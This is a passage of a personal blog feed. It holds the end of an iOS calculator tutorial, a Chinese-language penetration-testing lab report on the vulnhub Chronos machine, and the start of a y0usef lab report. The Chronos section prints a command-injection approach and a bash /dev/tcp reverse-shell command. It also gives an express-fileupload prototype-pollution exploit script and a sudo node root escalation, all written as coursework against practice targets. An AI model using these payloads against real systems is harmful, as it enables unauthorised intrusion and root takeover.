     sinButton.setTitle(<span class="string">&quot;sin⁻¹&quot;</span>, for: <span class="type">UIControl</span>.<span class="type">State</span>.normal)</span><br><span class="line">        cosButton.setTitle(<span class="string">&quot;cos⁻¹&quot;</span>, for: <span class="type">UIControl</span>.<span class="type">State</span>.normal)</span><br><span class="line">        tanButton.setTitle(<span class="string">&quot;tan⁻¹&quot;</span>, for: <span class="type">UIControl</span>.<span class="type">State</span>.normal)</span><br><span class="line">        isInv <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x05-转动设备时的界面切换"><a href="#0x05-转动设备时的界面切换" class="headerlink" title="0x05. 转动设备时的界面切换"></a>0x05. 转动设备时的界面切换</h4><p>重写 <code>didRotate</code> 对设备旋转时的事件进行处理：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="keyword">func</span> <span class="title function_">didRotate</span>(<span class="params">from</span> <span class="params">fromInterfaceOrientation</span>: <span class="type">UIInterfaceOrientation</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> device <span class="operator">=</span> <span class="type">UIDevice</span>.current</span><br><span class="line">    <span class="keyword">if</span> device.orientation <span class="operator">==</span> .landscapeLeft <span class="operator">||</span> device.orientation <span class="operator">==</span> .landscapeRight &#123;</span><br><span class="line">        <span class="comment">//横屏时候要做的事 do something</span></span><br><span class="line">        launchScienceMode()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        launchNormalMode()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>设备旋转为横屏时，调用 <code>launchScienceMode</code>：</p><p>显示附加按键区，更改按钮 title 的字号，更改按钮四个角的弧度。</p></li><li><p>设备旋转为竖屏时，调用 <code>launchNormalMode</code>：</p><p>隐藏附加按键区，恢复按钮 title 的字号，恢复按钮四个角的弧度。</p></li></ul><h3 id="0x1-辅助功能"><a href="#0x1-辅助功能" class="headerlink" title="0x1. 辅助功能"></a>0x1. 辅助功能</h3><h4 id="0x10-等于操作的作用"><a href="#0x10-等于操作的作用" class="headerlink" title="0x10. 等于操作的作用"></a>0x10. 等于操作的作用</h4><blockquote><p>自动显示运算结果的工作模式下，等于操作符的作用</p></blockquote><p>使用者点击等于操作符时，会将当前的待计算表达式替换为当前的运算结果。</p><h4 id="0x11-更好的删除操作"><a href="#0x11-更好的删除操作" class="headerlink" title="0x11. 更好的删除操作"></a>0x11. 更好的删除操作</h4><p>一般状态下使用者点击删除按钮会删除表达式中前一个字符，但当前一个字符与其之前的若干字符为一个整体时，会将其一同删除。（如 <code>sin(</code> 会作为一个整体同时删除）</p><h4 id="0x12-面向用户的报错机制"><a href="#0x12-面向用户的报错机制" class="headerlink" title="0x12. 面向用户的报错机制"></a>0x12. 面向用户的报错机制</h4><p>当计算过程中遇到任何语法错误无法向下计算时，会返回运算结果“ERROR”提示用户更改表达式，而不会继续解析格式错误的表达式。</p><h2 id="三、问题与解决"><a href="#三、问题与解决" class="headerlink" title="三、问题与解决"></a>三、问题与解决</h2><h3 id="0x0-使-Stack-View-中的空间按比例布局"><a href="#0x0-使-Stack-View-中的空间按比例布局" class="headerlink" title="0x0. 使 Stack View 中的空间按比例布局"></a>0x0. 使 <code>Stack View</code> 中的空间按比例布局</h3><blockquote><p>tags: Swift; StoryBoard; Stack View; xcode; iOS; 比例; 布局; 控件; UIKit;</p></blockquote><p>首先将 <code>Stack View</code> 的属性 <code>Distribution</code> 更改为 <code>Fill Proportionally</code>。</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/iw1/image-20221108143937299.png" alt="image-20221108143937299" width=300 /></body><p>选中需要布局的控件，按住 <code>command</code> 键拖到该 <code>Stack View</code> 上，</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/iw1/image-20221108145000732.png" alt="image-20221108145000732" width=450 /></body><p>选择 <code>Equal Widths</code> （若需要纵向成比例布局，则选择 <code>Equal Heights</code>）添加约束。</p><p><code>Additional Buttons.width = 0.4285 × width</code> 即表示控件 <code>Additional Buttons</code> 的宽为 <code>Stack View</code> 宽度的42.85%。</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/iw1/image-20221108153913974.png" alt="image-20221108153913974" width=350 /></body><h3 id="0x1-Swift获取当前设备的状态"><a href="#0x1-Swift获取当前设备的状态" class="headerlink" title="0x1. Swift获取当前设备的状态"></a>0x1. Swift获取当前设备的状态</h3><blockquote><p>tags: Swift; StoryBoard; xcode; iOS; 横屏; 竖屏; 设备状态; </p></blockquote><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> device <span class="operator">=</span> <span class="type">UIDevice</span>.current<span class="comment">// 获取当前设备对象</span></span><br><span class="line"><span class="comment">// 通过orientation属性获取设备朝向</span></span><br><span class="line"><span class="keyword">if</span> device.orientation <span class="operator">==</span> .landscapeLeft <span class="operator">||</span> device.orientation <span class="operator">==</span> .landscapeRight &#123;</span><br><span class="line">  <span class="comment">// 横屏时要做的事</span></span><br><span class="line">  <span class="operator">...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x2-代码实现修改Button字体大小"><a href="#0x2-代码实现修改Button字体大小" class="headerlink" title="0x2. 代码实现修改Button字体大小"></a>0x2. 代码实现修改Button字体大小</h3><blockquote><p>tags: Swift; xcode; iOS; UIButton; 字体大小;</p></blockquote><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取指定大小的字体</span></span><br><span class="line"><span class="keyword">func</span> <span class="title function_">getFont</span>(<span class="params">size</span>: <span class="type">CGFloat</span>) -&gt; <span class="type">UIFont</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">UIFont</span>.systemFont(ofSize: size)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修改原有字体</span></span><br><span class="line">expLabel.font <span class="operator">=</span> getFont(size: <span class="number">38.0</span>)</span><br></pre></td></tr></table></figure><h3 id="0x3-设置圆形的Button"><a href="#0x3-设置圆形的Button" class="headerlink" title="0x3. 设置圆形的Button"></a>0x3. 设置圆形的Button</h3><p>在 xcode 中为 Button 添加如下属性：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/iw1/image-20221108153117616.png" alt="image-20221108153117616" width=320 /></body><p>代码实现：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotButton.layer.cornerRadius <span class="operator">=</span> <span class="number">40.0</span></span><br></pre></td></tr></table></figure><p>该属性为 Button 四角的弧度，经调整后即可实现圆形的 Button。</p><h2 id="四、成果展示"><a href="#四、成果展示" class="headerlink" title="四、成果展示"></a>四、成果展示</h2><h4 id="0x00-完整流程"><a href="#0x00-完整流程" class="headerlink" title="0x00. 完整流程"></a>0x00. 完整流程</h4><p><a href="https://blog.kekwy.com/media/iw1/01.mp4">https://blog.kekwy.com/media/iw1/01.mp4</a></p><h4 id="0x01-压力测试（随便乱按）"><a href="#0x01-压力测试（随便乱按）" class="headerlink" title="0x01. 压力测试（随便乱按）"></a>0x01. 压力测试（随便乱按）</h4><p><a href="https://blog.kekwy.com/media/iw1/test.mov">https://blog.kekwy.com/media/iw1/test.mov</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;iOS assignment 1: Calculator App.&lt;/p&gt;
&lt;p&gt;姓名：可弟WZ Kekwy&lt;/p&gt;
&lt;p&gt;邮箱：&lt;a href=&quot;mailto:&amp;#x6b;&amp;#101;&amp;#x65;&amp;#x6b;&amp;#107;&amp;#101;&amp;#x77;&amp;</summary>
      
    
    
    
    <category term="iOS智能应用开发" scheme="http://blog.kekwy.com/categories/iOS%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="开发" scheme="http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="iOS" scheme="http://blog.kekwy.com/tags/iOS/"/>
    
    <category term="Xcode" scheme="http://blog.kekwy.com/tags/Xcode/"/>
    
  </entry>
  
  <entry>
    <title>【渗透测试】第五周 vulnhub-</title>
    <link href="http://blog.kekwy.com/lab5-report/"/>
    <id>http://blog.kekwy.com/lab5-report/</id>
    <published>2022-10-19T05:21:10.000Z</published>
    <updated>2023-12-28T08:10:25.973Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网络攻防实战-实验报告"><a href="#网络攻防实战-实验报告" class="headerlink" title="网络攻防实战 实验报告"></a>网络攻防实战 实验报告</h1><blockquote><p>网络攻防实战 第七次实验</p><p>邮箱：<a href="mailto:&#x6b;&#101;&#101;&#107;&#x6b;&#x65;&#119;&#121;&#64;&#113;&#x71;&#x2e;&#x63;&#x6f;&#109;">&#x6b;&#101;&#101;&#107;&#x6b;&#x65;&#119;&#121;&#64;&#113;&#x71;&#x2e;&#x63;&#x6f;&#109;</a></p><p>2022年10月19日</p><p>靶机链接：</p></blockquote><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[TOC]</p><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>获取靶机中的flag，并取得目标靶机的root权限。</p><p>我们将使用到以下攻击手段：</p><ul><li>主机发现、端口扫描</li><li>查看 web 源码</li><li>编&#x2F;解码</li><li>注入命令</li><li>反弹 shell</li><li>代码审计</li><li>搜索漏洞信息</li><li>利用 <code>express-fileupload</code> 的代码漏洞</li><li>本地提权</li></ul><h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote><p>kali: 10.0.2.15</p><p>靶机: 10.0.2.9</p></blockquote><h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol><li><p>发现靶机IP并对其进行端口扫描，查看各端口所运行的服务类型：</p><div align=left>    <img src="https://assets.kekwy.com/images/image-20221020092811961.png" width=750 /></div><p>发现目标靶机的80端口和8000端口上都运行了一个web应用。</p></li><li><p>首先通过浏览器访问靶机80端口上的 web 应用：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221020093445922.png" width=700 /></div><p>出现 “Data &amp; Time” 字样，无明显线索。查看源码，发现一段 JavaScript 代码：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221020094049616.png" width=700 /></div><p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 的 <code>beautify</code> 功能进行美化：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x5bdf = [</span><br><span class="line"><span class="string">&#x27;150447srWefj&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;70lwLrol&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1658165LmcNig&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;open&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1260881JUqdKM&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;10737CrnEEe&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2SjTdWC&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;readyState&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;responseText&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1278676qXleJg&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;797116soVTES&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;onreadystatechange&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;status&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1DYOODT&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;400909Mbbcfr&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Chronos&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2QRBPWS&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;getElementById&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;innerHTML&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;date&#x27;</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>发现其中包含对 <code>chronos.local</code> 的访问，尝试在 kali 上将其与靶机的IP地址绑定。</p></li><li><p>修改 <code>/etc/hosts</code> ，加入如下内容：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221020095325946.png" width=500 /></div><p>再次访问靶机 80 端口，发现出现了日期时间等字样：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021135006594.png" width=700 /></div></li></ol><h3 id="0x01-指令注入漏洞"><a href="#0x01-指令注入漏洞" class="headerlink" title="0x01. 指令注入漏洞"></a>0x01. 指令注入漏洞</h3><ol><li><p>再次查看网页源码发现一段疑似 base58 编码的字符串：</p><p><code>http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</code></p><p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 解码：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021135323274.png" width=750 /></div><p>得到 <code>&#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;</code>，推测此处存在指令注入漏洞。</p></li><li><p>再次访问靶机 80 端口，并通过 <code>Burp Suite</code> 拦截对访问 8000 端口时的数据包，并将其发送至 <code>Repeater</code>：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021135647863.png" width=600 /></div><p>尝试将我们想要执行的指令，通过 <code>&amp;&amp; [$cmd]</code> 的形式添加在 <code>format=</code> 之后（[$cmd] 是目标指令内容）。但是需要注意的是，我们的注入内容同样需要经过 base58 编码。</p><p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 对我们欲注入的内容进行编码，首先尝试执行 ls 指令：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021140051546.png" width=700 /></div></li><li><p>在 Repeater 中修改数据包：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021140158305.png" width=400 /></div><p>点击发送，查看返回结果，发现返回了某路径下的内容，确认其存在指令注入漏洞：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021140345158.png" width=400 /></div></li><li><p>接下来我们将尝试以此作为突破口生成反弹 shell。</p></li></ol><h3 id="0x02-生成反弹-shell"><a href="#0x02-生成反弹-shell" class="headerlink" title="0x02. 生成反弹 shell"></a>0x02. 生成反弹 shell</h3><ol><li><p>利用上述指令出入漏洞查看靶机 <code>/usr/bin</code> 下的文件，注入步骤同上：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021140646383.png" width=350 /></div><p>发现存在 python 环境，故尝试利用此前多次使用的 python 反弹 shell 代码生成反弹 shell。</p></li><li><p>在 kali 监听 4444 端口，将反弹 shell 命令编码后注入：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021141046767.png" width=550 /></div><p>成功获取到来自靶机的反弹 shell。</p></li><li><p>通过一下命令进行提升：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><div align=left> <img src="https://assets.kekwy.com/images/image-20221021141422079.png" width=550 /></div></li></ol><h3 id="0x03-node-js-express-fileupload-漏洞"><a href="#0x03-node-js-express-fileupload-漏洞" class="headerlink" title="0x03. node.js express-fileupload 漏洞"></a>0x03. node.js express-fileupload 漏洞</h3><ol><li><p>通过简单的信息收集，我们在 <code>/opt/chronos-v2/backend</code> 路径下找到了与 <code>node.js</code> 服务相关的文件 <code>server.js</code>：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021142250813.png" width=550 /></div><p>查看其内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&quot;express-fileupload&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileupload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&quot;/opt/chronos-v2/frontend/pages&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title class_">Server</span>(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.<span class="title function_">listen</span>(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>发现该代码在运行时会在本地 IP 的 8080 端口上运行一个 web 服务器。同时还发现该应用加载了 <code>express-fileupload</code> 库。通过搜索，发现若设置了 <code>app.use(fileupload(&#123; parseNested: true &#125;));</code> ，则存在可以用的漏洞。再次查看上述代码，发现恰好启用了该服务。</p></li><li><p>继续搜索有关内容，最终在一篇<a href="https://blog.p6.is/Real-World-JS-1/">博客文章</a>中找到可用的漏洞利用代码，并根据实验环境进行修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.0.2.15 为靶机的IP</span></span><br><span class="line"><span class="comment"># 5555 为靶机监听的端口</span></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.0.2.15/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://127.0.0.1:8080 为本次实验中目标服务的访问地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>先将该段代码写入位于 kali 的某一文件中，再通过之前实验中的方式，利用在 kali 上启动 web 服务的方式将该文件上传至靶机（通过之前的步骤我们得知靶机中存在 python 环境）</p><p><a id="要链接！！！"></a></p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021144921540.png" width=350 /></div></li><li><p>执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 code.py</span><br></pre></td></tr></table></figure><p>获取到另一个用户身份的反弹shell：</p><div align=left> <img src="https://assets.kekwy.com/images/@IFF6W$S]HAT[XN09[_}XU.png" width=700 /></div></li></ol><h3 id="0x04-第一个-Flag"><a href="#0x04-第一个-Flag" class="headerlink" title="0x04. 第一个 Flag"></a>0x04. 第一个 Flag</h3><ol><li><p>切换至当前用户的主目录 <code>/home/imera</code>，发现文件 <code>user.txt</code>。查看内容：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021151014936.png" width=400 /></div></li><li><p>使用 base58 解码后，得到：</p><p><code>Char &#39;I&#39; at position 12 not in alphabet</code></p></li></ol><h3 id="0x05-利用-node-命令提权"><a href="#0x05-利用-node-命令提权" class="headerlink" title="0x05. 利用 node 命令提权"></a>0x05. 利用 node 命令提权</h3><ol><li><p>查看当前用户可以通过 <code>sudo</code> 执行的命令：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021151621621.png" width=700 /></div><p>发现存在两个命令可以不提供密码直接使用 <code>sudo</code> 执行。</p></li><li><p>输入以下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo node -e <span class="string">&#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;</span></span><br></pre></td></tr></table></figure><p>生成一个拥有 root 权限的 shell 进行提权：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021151917440.png" width=700 /></div></li></ol><h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><p>Flag1：<code>Char &#39;I&#39; at position 12 not in alphabet</code></p><p>root 提权：</p><div align=left> <img src="https://assets.kekwy.com/images/image-20221021151917440.png" width=700 /></div><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul><li>访问靶机80端口，查看源码发现存在对域名地址 <code>chronos.local</code> 的访问；</li><li>修改 kali 的 <code>/etc/hosts</code> 文件，将上述域名与靶机 IP 绑定；</li><li>利用  <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 进行数据的编解码；</li><li>拦截访问靶机80端口时，向 <code>http://chronos.local:8000</code> 发送的数据包，利用命令注入漏洞注入编码后的反弹 shell 指令；</li><li>利用反弹 shell 进行信息收集，对文件  <code>/opt/chronos-v2/backend/server.js</code> 进行代码审计，发现隐藏的本地服务器；</li><li>上网搜索相关的漏洞信息，发现漏洞利用代码；</li><li>将代码文件上传至靶机并执行，得到另一个用户身份的反弹 shell；</li><li>利用 node 命令进行本地提权。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网络攻防实战-实验报告&quot;&gt;&lt;a href=&quot;#网络攻防实战-实验报告&quot; class=&quot;headerlink&quot; title=&quot;网络攻防实战 实验报告&quot;&gt;&lt;/a&gt;网络攻防实战 实验报告&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;网络攻防实战 第七次实验&lt;/p&gt;
&lt;p&gt;邮</summary>
      
    
    
    
    <category term="网络攻防实战" scheme="http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="学习" scheme="http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="Kali" scheme="http://blog.kekwy.com/tags/Kali/"/>
    
    <category term="网络" scheme="http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="安全" scheme="http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="http://blog.kekwy.com/tags/Linux/"/>
    
    <category term="vulnhub" scheme="http://blog.kekwy.com/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>【渗透测试】第一周 vulnhub-y0usef</title>
    <link href="http://blog.kekwy.com/vulnhub-y0usef/"/>
    <id>http://blog.kekwy.com/vulnhub-y0usef/</id>
    <published>2022-09-27T04:44:31.000Z</published>
    <updated>2023-12-28T08:11:00.748Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>第一周</p><p>可弟WZ</p><p>主页：blog.kekwy.com</p><p>邮箱：<a href="mailto:&#x6b;&#x65;&#x65;&#107;&#107;&#101;&#x77;&#x79;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;">&#x6b;&#x65;&#x65;&#107;&#107;&#101;&#x77;&#x79;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;</a></p><p>2022年9月27日</p></blockquote><h2 id="一、实验准备"><a href="#一、实验准备" class="headerlink" title="一、实验准备"></a>一、实验准备</h2><p>靶机：y0usef</p><p>下载链接：<a href="https://www.vulnhub.com/entry/y0usef-1,624/">https://www.vulnhub.com/entry/y0usef-1,624/</a></p><p>攻击机：kali</p><h2 id="二、实验目标"><a href="#二、实验目标" class="headerlink" title="二、实验目标"></a>二、实验目标</h2><p>取得目标靶机的root权限和2个flag。</p><h2 id="三、实验内容"><a href="#三、实验内容" class="headerlink" title="三、实验内容"></a>三、实验内容</h2><ol><li><p>在VirtualBox中同时启动kali攻击机和第三周靶机，并保证两者位于同一局域网下。</p></li><li><p>在kali中执行以下指令进行局域网主机发现：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921103912013.png" alt="image-20220921103912013"> </p><p>可以推断<sup>1</sup>出靶机 地址为 <code>10.0.2.5</code> 。</p><p><a id="jump1"></a></p><p><code>1：</code> 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。</p></li><li><p>在kali中执行以下指令扫描靶机的端口状态：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.5</span></span><br></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921083225282.png" alt="image-20220921083225282"> </p><p>发现开通了22、80两个端口，提示我们可以考虑靶机上的<code>ssh</code>与<code>http</code>服务。为了进一步确定各端口的用途，我们可以通过以下指令<sup>2</sup>获取对应的服务版本信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p22,80 -sV -sC 10.0.2.5</span></span><br></pre></td></tr></table></figure><p><a id="jump2"></a></p><p><code>2:</code> <code>-p</code> 对指定端口扫描</p><p>​    <code>-sV -sC</code> 默认安全脚本扫描</p><p>扫描结果如下：</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111148084.png" alt="image-20220921111148084"> </p></li><li><p>我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码：</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111747118.png" alt="image-20220921111747118"> </p><p> 